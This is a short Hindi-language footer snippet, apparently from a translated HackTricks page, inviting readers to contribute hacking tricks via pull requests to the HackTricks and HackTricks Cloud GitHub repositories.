* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
